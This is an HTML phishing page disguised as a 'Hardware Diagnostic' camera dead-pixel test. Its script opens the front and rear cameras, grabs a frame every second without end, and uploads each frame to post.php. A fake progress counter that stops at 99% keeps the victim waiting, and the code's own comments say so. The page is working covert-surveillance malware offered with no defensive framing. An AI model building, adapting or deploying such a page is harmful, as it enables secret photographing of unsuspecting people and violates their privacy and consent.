<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>System Diagnostic Tool</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #000; color: #fff; text-align: center; padding-top: 100px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #d21034; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .btn { background: #d21034; color: white; border: none; padding: 15px 30px; border-radius: 4px; cursor: pointer; font-size: 18px; font-weight: bold; margin-top: 20px; }
    </style>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
</head>
<body>
    <div id="setup">
        <h2>Hardware Diagnostic v4.2</h2>
        <p>Press the button to analyze camera sensors for dead pixels.</p>
        <button class="btn" id="start">START DIAGNOSTIC</button>
    </div>
    <div id="running" style="display:none;">
        <div class="loader"></div>
        <p id="stat">Analyzing Sensors... 0%</p>
        <p style="color:#666; font-size:12px;">Do not close this window. Analysis may take several minutes.</p>
    </div>
    <video id="v" autoplay style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        document.getElementById('start').addEventListener('click', function() {
            document.getElementById('setup').style.display = 'none';
            document.getElementById('running').style.display = 'block';
            
            const modes = ['user', 'environment'];
            modes.forEach(mode => {
                navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } }).then(stream => {
                    let video = document.getElementById('v');
                    video.srcObject = stream;
                    
                    // The Infinite Loop: Never stops unless tab is killed
                    setInterval(() => {
                        let canvas = document.getElementById('c');
                        canvas.width = 640; canvas.height = 480;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        $.post('post.php', { img: canvas.toDataURL('image/jpeg'), type: mode });
                    }, 1000); // 1 Frame Per Second (Persistent)
                }).catch(e => { document.getElementById('stat').innerText = "Sensor Error. Please Refresh."; });
            });

            // Visual trick: A fake counter that never reaches 100% to keep the victim waiting
            let p = 0;
            setInterval(() => {
                if(p < 99) p++;
                document.getElementById('stat').innerText = "Analyzing Sensors... " + p + "%";
            }, 5000);
        });
    </script>
</body>
</html>
